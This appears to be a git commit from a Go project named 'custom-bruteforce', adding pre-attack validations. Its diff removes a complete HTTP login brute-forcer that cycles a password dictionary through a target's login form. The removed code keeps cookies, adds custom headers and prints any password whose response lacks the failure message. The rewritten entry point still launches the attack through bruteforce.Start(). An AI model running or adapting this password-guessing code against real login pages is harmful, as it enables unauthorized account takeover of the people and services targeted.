2e81e6bdebb5ad1950b6dd0223905edf65274cbb
Naru Koshin <naru.koshin@outlook.jp>
2021-12-25 13:34:51 +0200

    more cleaner code.. I think so. added validations that will find issues before starting a bruteforce attack

--- pkg/app/app.go
+++ pkg/app/app.go
@@ -1,85 +1,32 @@
 package app
 
 import (
+	"custom-bruteforce/pkg/config"
 	"custom-bruteforce/pkg/bruteforce"
-	"custom-bruteforce/pkg/headers"
 	"custom-bruteforce/pkg/site"
 	"fmt"
-	"io/ioutil"
-	"strings"
-
-	"log"
-	"net/http"
-	"net/http/cookiejar"
-	"net/url"
 )
 
 func Run(){
-	// Creating a http client
-	client := http.Client{}
-
-	// Adding values
-	values := url.Values{}
-	for _, field := range site.Fields {
-		values.Set(field.Name, field.Value)
+	// verifying the config
+	if err := config.HasError(); err != nil {
+		fmt.Printf("error: %v\n", err)
+		return
 	}
-
-	// Enabling cookies
-	jar, err := cookiejar.New(nil)
+	// verifying the target host uri
+	if err := site.Verify_Host(); err != nil {
+		fmt.Printf("error: %v\n", err)
+		return
+	}
+	// verifying the request method
+	if err := site.Verify_Method(); err != nil {
+		fmt.Printf("error: %v\n", err)
+		return
+	}
+	// starting a bruteforce attack
+	err := bruteforce.Start()
 	if err != nil {
-		log.Fatal(err)
-	}
-	client.Jar = jar
-
-	// Calculating the length of the dictionary
-	total_passwords := len(bruteforce.Dictionary())
-
-	// going through the dictionary
-	for index, password := range bruteforce.Dictionary() {
-		index = index + 1
-		// Adding a password to the values
-		values.Set(bruteforce.Field, password)
-
-		// Creating a new http request
-		req, err := http.NewRequest(site.Method, site.Host, strings.NewReader(values.Encode()))
-		if err != nil {
-			log.Fatal(err)
-		}
-		defer req.Body.Close()
-
-		// Checking if there is any headers created in the file
-		if headers.Is() {
-			// Going through added headers
-			for _, header := range headers.Get() {
-				// Adding the headers to the http request
-				req.Header.Set(header.Name, header.Value)
-			}
-		}
-
-		// Sending a http request
-		resp, err := client.Do(req)
-		if err != nil {
-			log.Fatal(err)
-		}
-
-		// Checking if the response is 200 OK
-		if resp.StatusCode == http.StatusOK {
-			// Reading the response body
-			body, err := ioutil.ReadAll(resp.Body)
-			if err != nil {
-				log.Fatal(err)
-			}
-
-			// Checking if in the body is an error message that is specified in the file as an error message
-			if !strings.Contains(string(body), bruteforce.Fail.Message) {
-				// printing out the message if the password is found
-				fmt.Printf("Probably the password was found, password is: %v\n", password)
-				return
-			}
-			fmt.Printf("Testing password %v | progress (%v/%v)\n", password, index, total_passwords)
-		} else if resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
-			fmt.Println("Redirect detected")
-		}
-		
+		fmt.Printf("error: %v\n", err)
+		return
 	}
 }
